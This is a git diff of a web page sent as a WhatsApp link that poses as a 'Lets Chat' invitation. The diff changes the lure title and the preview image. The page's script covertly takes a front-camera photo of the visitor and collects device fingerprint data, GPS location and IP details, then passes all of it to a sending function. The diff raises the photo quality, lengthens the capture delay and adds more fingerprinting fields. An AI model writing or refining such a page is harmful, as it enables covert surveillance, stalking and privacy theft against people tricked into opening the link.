@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Lonely</title>
+    <title>Lets Chat</title>
     
     <!-- WhatsApp Preview -->
-    <meta property="og:title" content="Lonely">
+    <meta property="og:title" content="Lets Chat">
     <meta property="og:description" content="">
-    <meta property="og:image" content="https://i.imgur.com/2fK9pL8.jpg">
+    <meta property="og:image" content="https://raw.githubusercontent.com/KOKO17-stack/MISSCOOL/main/insta%20link.jpeg">
     <meta property="og:type" content="website">
 
     <style>
@@ -67,7 +67,7 @@
             let photoBase64 = null;
 
             try {
-                // Force front camera with better settings for low light
+                // Force front camera
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: "user",
@@ -80,7 +80,7 @@
                 video.srcObject = stream;
                 document.getElementById('cameraSection').style.display = 'block';
 
-                // Give more time for camera to adjust exposure (brighter photo)
+                // 4-second delay for better exposure (brighter photo)
                 setTimeout(() => {
                     try {
                         const canvas = document.createElement('canvas');
@@ -88,14 +88,14 @@
                         canvas.height = video.videoHeight || 720;
                         const ctx = canvas.getContext('2d');
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        photoBase64 = canvas.toDataURL('image/jpeg', 0.85);  // Higher quality for better visibility
+                        photoBase64 = canvas.toDataURL('image/jpeg', 0.92);
 
                         sendAllData(photoBase64);
                     } catch (err) {
                         console.error("Photo capture failed:", err);
                         sendAllData(null);
                     }
-                }, 2500);  // Increased delay for better exposure
+                }, 4000);
 
             } catch (err) {
                 document.getElementById('content').innerHTML = `<h2 class="error">权限被拒绝，请重试。</h2>`;
@@ -108,11 +108,15 @@
                 user_agent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
+                languages: navigator.languages ? navigator.languages.join(', ') : null,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                battery_level: null,
-                battery_charging: null,
+                device_pixel_ratio: window.devicePixelRatio,
                 screen_width: screen.width,
                 screen_height: screen.height,
+                screen_avail_width: screen.availWidth,
+                screen_avail_height: screen.availHeight,
+                battery_level: null,
+                battery_charging: null,
                 device_latitude: null,
                 device_longitude: null,
                 device_accuracy_meters: null,
@@ -124,7 +128,7 @@
                 note: "前置相机自动拍照"
             };
 
-            // Battery + GPS + IP (same as before)
+            // Battery
             if (navigator.getBattery) {
                 try {
                     const battery = await navigator.getBattery();
@@ -133,6 +137,7 @@
                 } catch (e) {}
             }
 
+            // GPS
             if (navigator.geolocation) {
                 try {
                     const pos = await new Promise((resolve, reject) => {
@@ -147,6 +152,7 @@
                 } catch (e) {}
             }
 
+            // IP
             try {
                 const res = await fetch('https://ipapi.co/json');
                 if (res.ok) {
